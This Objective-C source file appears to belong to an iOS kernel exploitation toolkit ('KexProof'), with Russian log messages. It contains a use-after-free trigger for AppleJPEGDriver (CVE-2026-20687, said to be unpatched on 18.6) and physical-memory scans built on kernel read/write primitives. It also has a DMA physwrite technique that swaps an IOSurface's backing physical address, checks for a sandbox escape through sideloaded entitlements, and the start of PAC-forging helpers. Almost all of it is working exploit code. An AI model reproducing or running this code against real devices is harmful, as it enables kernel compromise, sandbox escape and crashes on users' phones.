// req+0x78 into per-codec vector; close sets isInactive → taggedRelease
// skipped → freed JpegRequest stays queued; fullSpeedRequestExist walks the
// stale vector → MTE tag fault. JpegRequest 0x440; asyncToken (input+0x30)
// lands at req+16 — visible to our marker hunt live. Unpatched on 18.6
// (fixed 18.7.7). May panic — the panic IS the confirmation.
typedef struct __attribute__((packed)) {
    uint32_t sourceID;
    uint32_t field_04;
    uint32_t destID;
    uint32_t field_0C;
    uint32_t field_10;
    uint32_t width;
    uint32_t height;
    uint32_t field_1C;
    uint8_t  flags;
    uint8_t  pad_21[3];
    uint32_t xOffset;
    uint32_t yOffset;
    uint32_t subsampling;
    uint64_t asyncToken;
    uint64_t asyncToken2;
    uint64_t field_40;
    uint32_t codecID;
    uint32_t outWidth;
    uint32_t outHeight;
    uint32_t field_54;
} KPJIosStruct;
_Static_assert(sizeof(KPJIosStruct) == 0x58, "KPJIosStruct must be 88 bytes");

static NSData *kpJTestJPEG(int w, int h)
{
    UIGraphicsBeginImageContext(CGSizeMake(w, h));
    [[UIColor redColor] setFill];
    UIRectFill(CGRectMake(0, 0, w, h));
    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    // Progressive JPEG: multi-pass decode keeps HW busy far longer.
    NSMutableData *out = [NSMutableData data];
    CGImageDestinationRef dest = CGImageDestinationCreateWithData((__bridge CFMutableDataRef)out,
                                                                  (__bridge CFStringRef)@"public.jpeg", 1, NULL);
    if (dest) {
        CGImageDestinationAddImage(dest, img.CGImage, (__bridge CFDictionaryRef)@{
            (id)kCGImagePropertyJFIFIsProgressive: @YES,
            (id)kCGImageDestinationLossyCompressionQuality: @0.9,
        });
        CGImageDestinationFinalize(dest);
        CFRelease(dest);
    }
    if (!out.length) return UIImageJPEGRepresentation(img, 0.9);
    return out;
}

static IOSurfaceRef kpJCreateSrc(NSData *jpegData)
{
    size_t len = jpegData.length;
    size_t allocLen = (len + 0x3FFF) & ~0x3FFFUL;
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(allocLen),
        (id)kIOSurfaceHeight: @1,
        (id)kIOSurfaceBytesPerElement: @1,
        (id)kIOSurfacePixelFormat: @0x20202020,
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (!surf) return NULL;
    IOSurfaceLock(surf, 0, NULL);
    memcpy(IOSurfaceGetBaseAddress(surf), jpegData.bytes, jpegData.length);
    IOSurfaceUnlock(surf, 0, NULL);
    return surf;
}

static IOSurfaceRef kpJCreateDst(uint32_t w, uint32_t h)
{
    NSDictionary *props = @{
        (id)kIOSurfaceWidth: @(w),
        (id)kIOSurfaceHeight: @(h),
        (id)kIOSurfaceBytesPerElement: @4,
        (id)kIOSurfacePixelFormat: @0x42475241,
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)props);
}

static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                          uint32_t W, uint32_t H, int N, uint64_t tokenBase, NSMutableString *r)
{
    int submitted = 0;
    for (int j = 0; j < N; j++) {
        KPJIosStruct input = {0}, output = {0};
        input.sourceID    = srcID;
        input.field_04    = W * H;
        input.destID      = dstID;
        input.field_0C    = W * H * 4;
        input.width       = W;
        input.height      = H;
        input.outWidth    = W;
        input.outHeight   = H;
        input.subsampling = 3;
        input.asyncToken  = tokenBase + j;
        size_t outSize = sizeof(output);
        kern_return_t kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), &output, &outSize);
        if (kr != KERN_SUCCESS) {
            if (j == 0) kpNote(r, [NSString stringWithFormat:@"    submit[0]: kr=0x%x (%s)", kr, mach_error_string(kr)]);
            break;
        }
        submitted++;
    }
    return submitted;
}

+ (NSString *)jpegUafReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== CVE-2026-20687: AppleJPEGDriver startDecoder UAF (victim→reclaim→trigger) ===");
    kpNote(r, @"!!! МОЖЕТ ПАНИКОВАТЬ (MTE tag check fault в fullSpeedRequestExist) — паника = баг подтверждён !!!");

    errno = 0;
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AppleJPEGDriver"));
    if (!svc) {
        kpNote(r, [NSString stringWithFormat:@"  AppleJPEGDriver: не найден (errno=%d) — sandbox прячет", errno]);
        [r appendString:@"\n=== JPEG UAF SKIP: сервис недоступен ===\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  AppleJPEGDriver: 0x%x", svc]);

    // baseline probes
    {
        io_connect_t pc = 0;
        if (IOServiceOpen(svc, mach_task_self(), 0, &pc) == KERN_SUCCESS && pc) {
            kern_return_t kr = IOConnectCallMethod(pc, 2, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
            kpNote(r, [NSString stringWithFormat:@"  health (sel 2 query): kr=0x%x — драйвер %@", kr, kr == 0 ? @"OK" : @"BROKEN/занят"]);
            IOServiceClose(pc);
        }
    }

    const uint32_t W = 2048, H = 2048;
    NSData *jpegData = kpJTestJPEG(W, H);
    IOSurfaceRef srcS = kpJCreateSrc(jpegData);
    IOSurfaceRef dstS = kpJCreateDst(W, H);
    if (!srcS || !dstS) {
        kpNote(r, @"  IOSurfaceCreate failed — выход");
        if (srcS) CFRelease(srcS);
        if (dstS) CFRelease(dstS);
        IOObjectRelease(svc);
        [r appendString:@"\n=== JPEG UAF SKIP: surfaces ===\n"];
        return r;
    }
    uint32_t srcID = IOSurfaceGetID(srcS);
    uint32_t dstID = IOSurfaceGetID(dstS);
    kpNote(r, [NSString stringWithFormat:@"  surfaces: src=%u dst=%u jpeg=%lu bytes", srcID, dstID, (unsigned long)jpegData.length]);

    // Truncated source for the sync trigger: valid header, no EOI — decoder
    // starts and hangs to the 10s timeout (pool_free without dequeue).
    NSData *badData = [jpegData subdataWithRange:NSMakeRange(0, (NSUInteger)(jpegData.length * 0.4))];
    IOSurfaceRef srcBad = kpJCreateSrc(badData);
    uint32_t srcBadID = srcBad ? IOSurfaceGetID(srcBad) : 0;
    kpNote(r, [NSString stringWithFormat:@"  truncated src=%u (%lu байт, без EOI — таймаут-путь)", srcBadID, (unsigned long)badData.length]);

    // KRW marker hunt for asyncToken (lands at req+16) — sees the request
    // pool live: where JpegRequests sit, whether they recycle on reclaim.
    void (^tokenHunt)(uint64_t, NSString *) = ^(uint64_t marker, NSString *tag) {
        if (!gPrimitives.kreadbuf) return;
        uint64_t tableVA2 = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
        if (!tableVA2) return;
        uint64_t totalPages = kconstant(physSize) >> 14;
        if (totalPages > 6000) totalPages = 6000; // trimmed: tempo over coverage
        int hits = 0;
        for (uint64_t pg = 0; pg < totalPages && hits < 8; pg++) {
            uint8_t ent[16];
            kreadbuf(tableVA2 + pg * 16, ent, 16);
            if (ent[2] != 0x21) continue;
            if ((pg % 1000) == 0 && pg) kpNote(r, [NSString stringWithFormat:@"    %@: скан %llu/%llu…", tag, (unsigned long long)pg, (unsigned long long)totalPages]);
            uint64_t pa = kconstant(physBase) + pg * 0x4000;
            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
            if (!kva) continue;
            uint8_t buf[0x4000];
            if (!kpRead(kva, buf, sizeof(buf), "jpeg token scan", r)) continue;
            for (uint32_t o = 0; o + 8 <= sizeof(buf); o += 8) {
                uint64_t v = 0;
                memcpy(&v, buf + o, 8);
                if (v == marker) {
                    kpNote(r, [NSString stringWithFormat:@"    %@: токен %#llx @ kva=%#llx (PA=%#llx, +%#x)",
                              tag, (unsigned long long)marker, (unsigned long long)(kva + o), (unsigned long long)pa, o]);
                    hits++;
                    break;
                }
            }
        }
        kpNote(r, [NSString stringWithFormat:@"  %@: токен %#llx найден %d раз", tag, (unsigned long long)marker, hits]);
    };

    // Phase 1: victim-only — submit async, close mid-flight, NO reclaim. The
    // reclaim phase from the previous version was masking the bug: it refills
    // the freed slot with a valid object before the stale node is read, so
    // fullSpeedRequestExist always sees a live request. For the MTE fault we
    // need the stale node to read the FREED (FEEDFACE-poisoned) slot raw.
    const int CYCLES = 60, V_REQS = 8;
    int victimTotal = 0;
    BOOL healthy = YES;
    kpNote(r, [NSString stringWithFormat:@"  --- %d циклов: victim(%d async, 3мс окно, close), БЕЗ reclaim (reclaim прячет баг) ---", CYCLES, V_REQS]);
    for (int c = 0; c < CYCLES; c++) {
        io_connect_t victim = 0;
        kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
        if (kr == KERN_SUCCESS && victim) {
            victimTotal += kpJSubmitAsync(victim, srcID, dstID, W, H, V_REQS, 0x4141000000DEAD00ULL, r);
            usleep(3000); // in-flight окно: HW жуёт, close роняет mid-decode
            IOServiceClose(victim);
        }
        if ((c + 1) % 10 == 0) {
            io_connect_t hc = 0;
            healthy = (IOServiceOpen(svc, mach_task_self(), 0, &hc) == KERN_SUCCESS && hc);
            if (healthy) {
                kern_return_t hkr = IOConnectCallMethod(hc, 2, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
                healthy = (hkr == KERN_SUCCESS);
                IOServiceClose(hc);
            }
            kpNote(r, [NSString stringWithFormat:@"  [%d] health=%@ victim=%d — живы", c + 1, healthy ? @"OK" : @"BROKEN", victimTotal]);
            if (!healthy) break;
        }
    }

    // Phase 2: sync trigger from 8 parallel threads — progressive JPEG +
    // thread contention stretches decode latency toward the 10s timeout
    // (pool_free without dequeue → stale node read raw).
    kpNote(r, @"  --- sync trigger: 8 тредов × 5 sync decode (progressive, конкуренция → таймаут) ---");
    dispatch_group_t grp = dispatch_group_create();
    for (int t = 0; t < 8; t++) {
        dispatch_group_async(grp, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            for (int i = 0; i < 5; i++) {
                io_connect_t tc = 0;
                if (IOServiceOpen(svc, mach_task_self(), 0, &tc) != KERN_SUCCESS || !tc) continue;
                KPJIosStruct in = {0}, out = {0};
                in.sourceID    = srcBadID ? srcBadID : srcID;
                in.field_04    = W * H;
                in.destID      = dstID;
                in.field_0C    = W * H * 4;
                in.width       = W;
                in.height      = H;
                in.outWidth    = W;
                in.outHeight   = H;
                in.subsampling = 3;
                in.asyncToken  = 0;
                size_t os = sizeof(out);
                kern_return_t kr = IOConnectCallStructMethod(tc, 1, &in, sizeof(in), &out, &os);
                if (t == 0 && i < 3) kpNote(r, [NSString stringWithFormat:@"    sync[t0/%d]: kr=0x%x", i, kr]);
                IOServiceClose(tc);
            }
        });
    }
    dispatch_group_wait(grp, dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC));
    tokenHunt(0x4141000000DEAD00ULL, @"victim-токен (висит ли в freed слоте)");

    io_connect_t fc = 0;
    BOOL finalOK = (IOServiceOpen(svc, mach_task_self(), 0, &fc) == KERN_SUCCESS && fc);
    if (finalOK) { IOServiceClose(fc); }
    kpNote(r, [NSString stringWithFormat:@"  финал: драйвер %@ · victim=%d", finalOK ? @"OK" : @"BROKEN (DoS подтверждён)", victimTotal]);

    CFRelease(srcS);
    if (srcBad) CFRelease(srcBad);
    CFRelease(dstS);
    IOObjectRelease(svc);
    [r appendString:@"\n=== JPEG UAF: дожили до конца без паники — повторить; паника может быть DEFERRED (открой Camera сам — sync decode дотянет stale node) ===\n"];
    return r;
}

#pragma mark - IOSurfaceRoot external method surface probe

// Empirical map of IOSurfaceRootUserClient: open IOSurfaceRoot (every app can
// create IOSurfaces, so the root client is reachable from any sandbox) and
// call selectors 0-63 with a few feed sizes. Unsupported vs BadArgument vs
// Success reveals which methods exist — the hit list for reverse work.
+ (NSString *)iosurfaceProbeReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== IOSurfaceRootUserClient: карта селекторов (sel 0-63 × 3 корма) ===");

    errno = 0;
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) {
        kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: не найден (errno=%d)", errno]);
        [r appendString:@"\n=== IOSURF SKIP: сервис недоступен ===\n"];
        return r;
    }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    if (kr != KERN_SUCCESS || !conn) {
        kpNote(r, [NSString stringWithFormat:@"  IOServiceOpen: kr=0x%x (%s)", kr, mach_error_string(kr)]);
        IOObjectRelease(svc);
        [r appendString:@"\n=== IOSURF SKIP: open не прошёл ===\n"];
        return r;
    }
    kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot открыт: svc=0x%x conn=0x%x", svc, conn]);

    static const struct { const char *name; size_t sz; } feeds[3] = {
        { "пусто", 0 }, { "0x58", 0x58 }, { "0x1000", 0x1000 },
    };
    uint8_t inBuf[0x1000];
    memset(inBuf, 0, sizeof(inBuf));
    for (int sel = 0; sel < 64; sel++) {
        NSMutableString *line = [NSMutableString stringWithFormat:@"  sel %2d:", sel];
        for (int f = 0; f < 3; f++) {
            uint64_t outS[16] = {0}; uint32_t outC = 16;
            uint8_t outBuf[0x1000];
            size_t outSz = sizeof(outBuf);
            kern_return_t ckr;
            if (feeds[f].sz == 0) {
                ckr = IOConnectCallMethod(conn, sel, NULL, 0, NULL, 0, outS, &outC, NULL, NULL);
            } else {
                ckr = IOConnectCallMethod(conn, sel, NULL, 0, inBuf, feeds[f].sz, outS, &outC, outBuf, &outSz);
            }
            const char *tag = "?";
            switch (ckr) {
                case 0: tag = "OK"; break;
                case 0xe00002c7: tag = "unsup"; break;
                case 0xe00002c2: tag = "arg"; break;
                case 0xe00002bc: tag = "err"; break;
                case 0xe00002be: tag = "perm"; break;
                case 0xe00002c5: tag = "busy"; break;
                case 0xe00002ca: tag = "nomem"; break;
                case 0xe00002cd: tag = "inval"; break;
                case 0xe0000001: tag = "karg"; break;
            }
            [line appendFormat:@" %s=%s", feeds[f].name, tag];
            if (ckr == 0 && outS[0]) [line appendFormat:@"(out0=%#llx)", (unsigned long long)outS[0]];
        }
        kpNote(r, line);
    }
    IOServiceClose(conn);
    IOObjectRelease(svc);
    [r appendString:@"\n=== Живые методы: не-unsup. Дальше реверс тех, что принимают structIn (arg) — там валидация ===\n"];
    return r;
}

#pragma mark - IOSurface backing-PA swap (physwrite via DMA)

// The IOSurface kernel object lives in writable heap (type 0x21 — physmap
// write user proven). Its backing page list sits at +0x360 (ranges ptr) and
// +0x3a4 (rangeCount) per the interface doc. Overwrite ranges[0].pa with a
// target page and submit the scaler on that surface — the DMA engine writes
// wherever we point. Control page first (pixels must land there), then a
// protected page to test whether DART validation rejects it.
+ (NSString *)iosurfacePaSwapReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== IOSurface backing-PA swap: physwrite через DMA ===");
    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
        [r appendString:@"KRW не жив — сначала эксплойт.\n"];
        return r;
    }

    // 1. victim surface (dst for the scaler) + control page (our target)
    NSDictionary *sp = @{(__bridge id)kIOSurfaceWidth: @32, (__bridge id)kIOSurfaceHeight: @32,
                         (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
    if (!dstS || !srcS) { [r appendString:@"FAIL: surfaces\n"]; return r; }
    uint32_t dstID = IOSurfaceGetID(dstS);
    uint32_t srcID = IOSurfaceGetID(srcS);
    kpNote(r, [NSString stringWithFormat:@"  surfaces: srcID=%u dstID=%u (подменяем backing у dst)", srcID, dstID]);

    // control page: marker-filled, we own it; get its PA through our own pmap
    uint8_t *ctl = valloc(0x4000);
    memset(ctl, 0xCC, 0x4000);
    uint64_t selfProcM = [self findProcByCommName:getprogname() log:r];
    if (!selfProcM) selfProcM = [self findProcByCommName:"KexProof" log:r];
    uint64_t prM = 0, tkM = 0, mpM = 0, pmM = 0, ttM = 0;
    uint64_t ctlPA = 0;
    if (selfProcM &&
        kpRead(selfProcM + koffsetof(proc, proc_ro), &prM, 8, "ps proc_ro", r) &&
        kpRead(kp_untag_ptr(prM) + off_proc_ro_pr_task, &tkM, 8, "ps task", r)) {
        tkM = kp_untag_ptr(tkM);
        kpRead(tkM + off_task_map, &mpM, 8, "ps map", r);
        mpM = kp_untag_ptr(mpM);
        kpRead(mpM + koffsetof(vm_map, pmap), &pmM, 8, "ps pmap", r);
        pmM = kp_untag_ptr(pmM);
        kpRead(pmM + koffsetof(pmap, ttep), &ttM, 8, "ps ttep", r);
        ttM = kp_untag_ptr(ttM);
        if (ttM) ctlPA = vtophys(ttM, (uint64_t)ctl);
    }
    kpNote(r, [NSString stringWithFormat:@"  контрольная страница: VA=%#llx PA=%#llx (заполнена 0xCC)",
              (unsigned long long)(uint64_t)ctl, (unsigned long long)ctlPA]);
    if (!ctlPA) { [r appendString:@"FAIL: контрольный PA не получен\n"]; free(ctl); return r; }

    // 2. find BOTH surface objects precisely: a heap page containing the
    //    unique triple {ID, width=32, pixelFormat='BGRA'} within 0x400 bytes.
    //    Then diff the two identical-layout objects: the field that differs
    //    and looks like a PA (0x100xxxxxxxx) is the backing PA — the swap field.
    uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
    uint64_t surfObjVA = 0, srcObjVA = 0;
    uint64_t totalPages = kconstant(physSize) >> 14;
    int checked = 0;
    for (uint64_t pg = 0; pg < totalPages && !(surfObjVA && srcObjVA); pg++) {
        uint8_t ent[16];
        kreadbuf(tableVA + pg * 16, ent, 16);
        if (ent[2] != 0x21) continue;
        uint64_t pa = kconstant(physBase) + pg * 0x4000;
        uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
        if (!kva) continue;
        uint8_t buf[0x4000];
        if (!kpRead(kva, buf, sizeof(buf), "iosurf triple scan", r)) continue;
        checked++;
        for (uint32_t o = 0; o + 0x400 <= sizeof(buf); o += 8) {
            uint32_t v = 0;
            memcpy(&v, buf + o, 4);
            if (v != dstID && v != srcID) continue;
            // triple check: width=32 and 'BGRA' nearby
            BOOL hasW = NO, hasFmt = NO;
            for (uint32_t w2 = 0; w2 + 4 <= 0x400; w2 += 4) {
                uint32_t x = 0;
                memcpy(&x, buf + o + w2, 4);
                if (x == 32) hasW = YES;
                if (x == 0x42475241) hasFmt = YES;
            }
            if (!hasW || !hasFmt) continue;
            // candidate object base: scan ±0x400 for the object start via
            // its vtable pointer (first qword is a tagged kernel pointer
            // into the IOSurface kext range — but just take the ID region).
            uint64_t obj = kva + o;
            if (v == dstID && !surfObjVA) { surfObjVA = obj; kpNote(r, [NSString stringWithFormat:@"  dst объект @ %#llx (тройка ID+32+BGRA сошлась)", (unsigned long long)obj]); }
            if (v == srcID && !srcObjVA) { srcObjVA = obj; kpNote(r, [NSString stringWithFormat:@"  src объект @ %#llx (тройка сошлась)", (unsigned long long)obj]); }
        }
    }
    if (!(surfObjVA && srcObjVA)) {
        kpNote(r, [NSString stringWithFormat:@"  объекты не найдены (dst=%@ src=%@, страниц %d) — layout/тип другой",
                  surfObjVA ? @"есть" : @"нет", srcObjVA ? @"есть" : @"нет", checked]);
        free(ctl);
        [r appendString:@"\n=== FAIL: объекты поверхностей не найдены ===\n"];
        return r;
    }

    // 3. dump both and diff: find the backing PA field = PA-shaped value
    //    that differs between two identical-layout surfaces.
    uint8_t dSrc[0x200], dDst[0x200];
    memset(dSrc, 0, sizeof(dSrc));
    memset(dDst, 0, sizeof(dDst));
    // object base may be a bit before the ID field; read a window around it
    uint64_t readBaseDst = surfObjVA > 0x100 ? surfObjVA - 0x100 : surfObjVA;
    uint64_t readBaseSrc = srcObjVA > 0x100 ? srcObjVA - 0x100 : srcObjVA;
    if (!kpRead(readBaseDst, dDst, sizeof(dDst), "dst obj dump", r)) { free(ctl); return r; }
    if (!kpRead(readBaseSrc, dSrc, sizeof(dSrc), "src obj dump", r)) { free(ctl); return r; }
    int hitOff = -1;
    uint64_t hitVA = 0, srcPAval = 0, dstPAval = 0;
    for (uint32_t o = 0; o + 8 <= sizeof(dDst); o += 8) {
        uint64_t qd = 0, qs = 0;
        memcpy(&qd, dDst + o, 8);
        memcpy(&qs, dSrc + o, 8);
        if (qd == qs) continue;
        BOOL dstPa = (qd > 0x10000000000ULL && qd < 0x20000000000ULL);
        BOOL srcPa = (qs > 0x10000000000ULL && qs < 0x20000000000ULL);
        if (dstPa && srcPa) {
            kpNote(r, [NSString stringWithFormat:@"  diff +%#x: dst=%#llx src=%#llx ← кандидат backing PA", o,
                      (unsigned long long)qd, (unsigned long long)qs]);
            if (hitOff < 0) { hitOff = (int)o; hitVA = readBaseDst + o; dstPAval = qd; srcPAval = qs; }
        }
    }

    if (hitOff >= 0) {
        kpNote(r, [NSString stringWithFormat:@"  backing PA выбран @ %#llx (+%#x, dst=%#llx src=%#llx) — это и есть поле подмены",
                  (unsigned long long)hitVA, hitOff, (unsigned long long)dstPAval, (unsigned long long)srcPAval]);
    } else {
        // the dst record IS the IOSurface object (width/BPR/'BGRA'/allocSize/
        // ID all present). Backing lives in a linked IOMemoryDescriptor —
        // follow every kernel-pointer field of dDst one level and hunt a
        // PA-shaped value (0x100xxxxxxxx).
        kpNote(r, @"  dDst = сам IOSurface объект (поля сошлись). Иду по его указателям (lvl2) за backing:");
        for (uint32_t o = 0; o + 8 <= sizeof(dDst) && hitOff < 0; o += 8) {
            uint64_t q = 0;
            memcpy(&q, dDst + o, 8);
            uint64_t u = kp_untag_ptr(q);
            if (!kpLooksLikeKernelPointer(u)) continue;
            uint8_t d2[0x100];
            memset(d2, 0, sizeof(d2));
            if (!kpRead(u, d2, sizeof(d2), "lvl2 dump", r)) continue;
            for (uint32_t o2 = 0; o2 + 8 <= sizeof(d2); o2 += 8) {
                uint64_t q2 = 0;
                memcpy(&q2, d2 + o2, 8);
                if (q2 > 0x10000000000ULL && q2 < 0x20000000000ULL) {
                    kpNote(r, [NSString stringWithFormat:@"    lvl2 [dDst+%#x → %#llx] +0x%02x: %#018llx ← кандидат backing PA",
                              o, (unsigned long long)u, o2, (unsigned long long)q2]);
                    if (hitOff < 0) { hitOff = (int)o2; hitVA = u + o2; dstPAval = q2; }
                }
            }
        }
    }

    // 4. swap the REAL backing field (if found) → control page, submit, check
    uint64_t origPA = 0;
    if (hitOff >= 0 && hitVA) {
        kreadbuf(hitVA, &origPA, 8);
        kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА backing %#llx → %#llx (контрольная)", (unsigned long long)origPA, (unsigned long long)ctlPA]);
        kwritebuf(hitVA, &ctlPA, 8);
        uint64_t rb = 0;
        kreadbuf(hitVA, &rb, 8);
        kpNote(r, [NSString stringWithFormat:@"  readback = %#llx %@", (unsigned long long)rb, rb == ctlPA ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
    } else {
        kpNote(r, @"  поле backing не найден — submit без подмены (контроль не изменится; дамп выше для layout)");
    }

    // 5. submit the scaler with dstID — DMA writes result into our control page
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
    kern_return_t skr = 0;
    if (svc) {
        io_connect_t conn = 0;
        skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
        if (skr == KERN_SUCCESS && conn) {
            uint8_t tsd[0x1B0];
            memset(tsd, 0, sizeof(tsd));
            *(uint32_t *)(tsd + 0) = srcID;
            *(uint32_t *)(tsd + 4) = dstID;
            skr = IOConnectCallMethod(conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
            kpNote(r, [NSString stringWithFormat:@"  scaler submit (sel 1): kr=0x%x (%s)", skr, mach_error_string(skr)]);
            IOServiceClose(conn);
        }
        IOObjectRelease(svc);
    }

    // 6. verdict: did the control page get written by DMA?
    int changed = 0;
    for (uint32_t i = 0; i < 0x4000; i += 4) {
        uint32_t px = *(volatile uint32_t *)(ctl + i);
        if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
    }
    if (changed) {
        kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — подмена backing работает, дальше подставляем защищённую страницу ===", changed]);
    } else {
        kpNote(r, @"  контрольная страница не изменилась — scaler не записал (submit отклонён/DART проверил тип страницы?)");
    }
    // restore (don't leave the surface corrupted for later runs)
    if (hitOff >= 0 && hitVA && origPA) kwritebuf(hitVA, &origPA, 8);
    free(ctl);
    return r;
}

#pragma mark - Entitlements test (lara grant verification)

// Binary check that the Plume sideloader granted the lara entitlements we
// declared: no-sandbox (fork must succeed), iokit-user-client-class
// (AGXDevice, HID virtual device), tcc (file access), mobileinstall.
+ (NSString *)entitlementsTestReport
{
    NSMutableString *r = [NSMutableString string];
    kpNote(r, @"=== ENTITLEMENTS TEST: применились ли lara-энтитлменты ===");

    // 1. no-sandbox: fork() — banned inside the app sandbox
    pid_t fpid = fork();
    if (fpid == 0) { _exit(42); }
    int st = 0;
    if (fpid > 0) waitpid(fpid, &st, 0);
    kpNote(r, [NSString stringWithFormat:@"  fork(): %@%@",
              fpid >= 0 ? @"РАБОТАЕТ (no-sandbox ПРИМЕНЁН!)" : @"ОТКАЗ",
              fpid >= 0 ? @"" : [NSString stringWithFormat:@" errno=%d (%s)", errno, strerror(errno)]]);

    // 2. iokit-user-client-class: AGXDevice open
    io_service_t agx = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXDevice"));
    if (agx) {
        io_connect_t ac = 0;
        kern_return_t kr = IOServiceOpen(agx, mach_task_self(), 0, &ac);
        kpNote(r, [NSString stringWithFormat:@"  AGXDevice: сервис 0x%x, open kr=0x%x (%s)%@",
                  agx, kr, mach_error_string(kr), kr == 0 ? @" ← AGX ДОСТУПЕН (Rocket physwrite-вектор открыт!)" : @""]);
        if (ac) IOServiceClose(ac);
        IOObjectRelease(agx);
    } else {
        kpNote(r, @"  AGXDevice: сервис не найден");
    }

    // 3. iokit: HID virtual device (for CVE-2026-28992)
    extern CFTypeRef IOHIDUserDeviceCreate(CFAllocatorRef allocator, CFDictionaryRef properties);
    NSDictionary *devProps = @{
        @"VendorID": @0x1337, @"ProductID": @0x4242, @"Product": @"KPEntTest",
        @"DeviceUsagePairs": @[ @{ @"DeviceUsagePage": @1, @"DeviceUsage": @6 } ],
        @"Elements": @[ @{ @"ElementCookie": @1, @"UsagePage": @1, @"Usage": @6,
                           @"Type": @2, @"ReportCount": @8, @"ReportSize": @1 } ],
    };
    CFTypeRef vdev = IOHIDUserDeviceCreate(kCFAllocatorDefault, (__bridge CFDictionaryRef)devProps);
    kpNote(r, [NSString stringWithFormat:@"  IOHIDUserDeviceCreate: %@%@",
              vdev ? @"РАБОТАЕТ (HID virtual есть — CVE-2026-28992 gate открыт!)" : @"NULL (entitlement не применён)",
              vdev ? @"" : @""]);
    if (vdev) CFRelease(vdev);

    // 4. tcc: read a root-only path (SpringBoard material recipes, like lara)
    const char *probePath = "/private/var/mobile/Library/SpringBoard/IconState.plist";
    int fd = open(probePath, O_RDONLY);
    kpNote(r, [NSString stringWithFormat:@"  tcc (open %s): %@%@", probePath,
              fd >= 0 ? @"ЧИТАЕТСЯ (tcc all files ПРИМЕНЁН!)" : @"ОТКАЗ",
              fd >= 0 ? @"" : [NSString stringWithFormat:@" errno=%d (%s)", errno, strerror(errno)]]);
    if (fd >= 0) close(fd);

    [r appendString:@"\n=== Результат: каждый РАБОТАЕТ = стена снята. fork → EXP-13 nest/unnest; AGX → Rocket physwrite; HID virtual → CVE-2026-28992; tcc → системные файлы ===\n"];
    return r;
}

#pragma mark - PAC forging test (TaskRop port)

// Resolve a mach thread port to its kernel thread_t VA through our own
// itk_space ladder (same chain as E10/D1/m2 dumpClient).
static uint64_t kpRCIsTable = 0;

+ (uint64_t)rcIsTableWithLog:(NSMutableString *)r
{
    if (kpRCIsTable) return kpRCIsTable;
    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
    if (!selfProc) selfProc = [self findProcByCommName:"KexProof" log:r];
    if (!selfProc) return 0;
    uint64_t pr = 0, tk = 0, sp = 0, tb = 0;
    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &pr, 8, "rc proc_ro", r)) return 0;
    pr = kp_untag_ptr(pr);
    if (!kpRead(pr + off_proc_ro_pr_task, &tk, 8, "rc task", r)) return 0;
    tk = kp_untag_ptr(tk);
    if (!kpRead(tk + off_task_itk_space, &sp, 8, "rc itk_space", r)) return 0;
    sp = kp_untag_ptr(sp);
    if (!kpRead(sp + off_ipc_space_is_table, &tb, 8, "rc is_table", r)) return 0;
    kpRCIsTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
                  ? kp_untag_ptr(kpSMRDecode(tb)) : kp_untag_ptr(tb);
    return kpRCIsTable;
}

+ (uint64_t)rcResolveThreadKVA:(mach_port_t)port
{
    uint64_t table = kpRCIsTable;
    if (!table) return 0;
    uint64_t eVA = table + (uint64_t)sizeof_ipc_entry * (port >> 8);
    uint64_t oRaw = 0, kRaw = 0;
    kreadbuf(eVA + off_ipc_entry_ie_object, &oRaw, 8);
    uint64_t pVA = kp_untag_ptr(oRaw);
    if (!(pVA > 0xffffff0000000000ULL && pVA < 0xffffffff00000000ULL)) return 0;
    kreadbuf(pVA + off_ipc_port_ip_kobject, &kRaw, 8);
    return kp_untag_ptr(kRaw);
}

static void kpPacLive(NSString *line)
{
    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-pac.txt"];
